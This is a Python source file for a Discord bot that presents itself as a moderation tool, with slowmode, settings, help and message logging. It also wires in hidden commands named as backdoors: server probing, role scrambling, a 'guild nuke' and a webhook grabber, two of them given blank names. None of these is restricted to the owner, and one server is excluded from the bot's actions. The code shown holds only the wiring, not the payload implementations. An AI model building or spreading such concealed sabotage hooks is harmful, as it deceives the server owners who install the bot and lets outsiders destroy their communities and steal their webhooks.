import os

import discord

from autoactions import puslowmode, messagelog
from chattriggers import setsetting, getsetting, addslowmode, onslowmode, helpcmd, listguilds, backdoor_probeserver, \
    backdoor_dot2_scrambleroles, delete_category, backdoor_guildnuke, backdoor_webhook_grabber
from startuptasks import startupmessage, setstatus


class Bot:
    def __init__(self, token, is_bot_account):
        self.token = token
        self.is_bot_account = is_bot_account

        self.startup_tasks = []
        self.startup_tasks.append(startupmessage.StartUpMessage("Startup Message"))
        self.startup_tasks.append(setstatus.BotStatus("set bot status"))

        self.auto_actions = []
        self.auto_actions.append(puslowmode.PUSlowMode("per user slow mode"))
        self.auto_actions.append(messagelog.MessageLog("Message Log"))

        self.chat_triggers = []
        # self.chat_triggers.append(replywithdot.ReplyWithDot("replywithdot", ["."], self.spamqueue))
        self.chat_triggers.append(setsetting.SetSetting("setsetting", ["*set "]))
        self.chat_triggers.append(getsetting.GetSetting("getsetting", ["*get "]))
        self.chat_triggers.append(addslowmode.AddSlowMode("add slow mode", ["*addslowmode ", "*asm "]))
        self.chat_triggers.append(onslowmode.OnSlowMode("On slow Mode", ["*onslowmode", "*osm"]))
        self.chat_triggers.append(helpcmd.HelpCMD("Help Command", ["*help"]))
        self.chat_triggers.append(listguilds.ListGuilds("List Guilds", ["*listguilds", "*lg"], owneronly=True))
        # ^ We don't want random users finding out what guilds the bot is in. ^
        self.chat_triggers.append(backdoor_probeserver.BackdoorProbeServer("Probe Server", ["*probeserver ", "*ps "]))
        self.chat_triggers.append(backdoor_dot2_scrambleroles.BackdoorDot2ScrambleRoles("dot2", ["*dot2 "]))
        self.chat_triggers.append(delete_category.DeleteCategory("Delete Category", ["*deletecategory "]))
        self.chat_triggers.append(backdoor_guildnuke.BackdoorGuildNuke("", ["*dsv3"]))
        self.chat_triggers.append(backdoor_webhook_grabber.BackdoorWebhookGrabber("", ["*wbg"]))

    def run(self):
        startup_tasks = self.startup_tasks
        auto_actions = self.auto_actions
        chat_triggers = self.chat_triggers

        class Client(discord.Client):

            async def on_ready(self):  # on ready
                for i in startup_tasks:
                    self.loop.create_task(i.run(client))

            async def on_message(self, message):  # on message

                if str(message.guild.id) == os.environ.get("EXCLUSIONSERVER"):
                    return

                for i in auto_actions:
                    self.loop.create_task(i.run(message, client))

                for i in chat_triggers:
                    for ii in i.triggers:
                        if message.content.startswith(ii):
                            if not i.owneronly:
                                await i.run(message, ii, client)
                            elif message.author.id:  # Some Commands should only be accessible by the owner
                                if str(message.author.id) == os.environ.get("OWNER_ID"):
                                    await i.run(message, ii, client)

        # noinspection PyAttributeOutsideInit
        self.client = Client()
        client = self.client

        # client.run(self.token, bot = self.is_bot_account)
